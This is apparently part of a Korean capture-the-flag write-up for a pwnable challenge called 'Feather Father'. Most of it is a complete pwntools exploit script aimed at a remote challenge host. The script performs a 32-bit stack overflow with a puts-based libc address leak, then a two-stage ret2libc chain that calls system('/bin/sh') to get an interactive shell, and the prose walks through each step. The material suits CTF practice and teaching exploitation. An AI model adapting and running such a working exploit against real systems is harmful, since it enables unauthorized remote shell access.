
```

```


## Exploit
```python
from pwn import *
import time

host = "chall.v1t.site"
port = 30212
libc = ELF('./libc.so.6')
exe = ELF('./chall')
context.arch = 'i386'
pad = 312

def recv_all(r, timeout=1.0):
    data = b''
    t0 = time.time()
    while time.time()-t0 < timeout:
        try:
            chunk = r.recv(timeout=0.2)
        except EOFError:
            break
        if not chunk:
            continue
        data += chunk
    return data

def find_leak(data):
    for i in range(len(data)-3):
        v = u32(data[i:i+4])
        if 0xf7000000 <= v <= 0xf7ffffff or 0x7f000000 <= v <= 0x7fffffff:
            return v
    return None

r = remote(host, port)
puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
main_addr = exe.symbols['main']

p1 = b'A'*pad + p32(puts_plt) + p32(main_addr) + p32(puts_got)
r.send(p1)
data = recv_all(r, timeout=2.0)
leak = find_leak(data)
if not leak:
    print("no leak, raw:", data.hex())
    r.close()
    exit(1)

base = leak - libc.symbols['puts']
system = base + libc.symbols['system']
binsh = base + next(libc.search(b'/bin/sh'))

payload2 = b'A'*pad + p32(system) + p32(main_addr) + p32(binsh)
r.send(payload2)
r.interactive()

```
익스플로잇은 pwntools를 이용해 두 단계로 구성한다. 

먼저 원격 또는 로컬 프로세스에 접속한 뒤, 배너 출력은 그대로 받아 버리고 패딩 312바이트 뒤에 `puts_plt`, `main`, `puts_got`를 순서대로 배치한 페이로드를 전송한다. 이렇게 하면 vuln에서 리턴할 때 EIP가 puts@plt로 바뀌고, 첫 번째 인자로 puts@got가 전달되어 puts가 자신의 GOT 엔트리에 저장된 실제 libc 주소를 출력한 뒤 다시 main으로 돌아가게 된다. 

수신한 출력에서 4바이트를 뽑아 puts의 주소를 얻고, `libc_base = leak - libc.sym["puts"]`로 libc 베이스를 계산한다. 이어서 `system = libc_base + libc.sym["system"]`, `binsh = libc_base + next(libc.search(b"/bin/sh"))`를 구한 다음, 2단계 페이로드를 다시 패딩 312바이트 뒤에 `system`, `main`, `binsh` 순서로 구성해 보내면 vuln의 리턴 시 system("/bin/sh")가 호출되며 쉘을 얻을 수 있다.

즉, 스택 오버플로우로 리턴 주소를 제어한 뒤, puts를 이용해 libc 주소를 누출하고, 계산한 system과 "/bin/sh" 주소로 ret2libc 2단계 체인을 구성하는 전형적인 익스플로잇이라고 볼 수 있었다.

## Solved
![](pwnable/Feather%20Father/image1.png)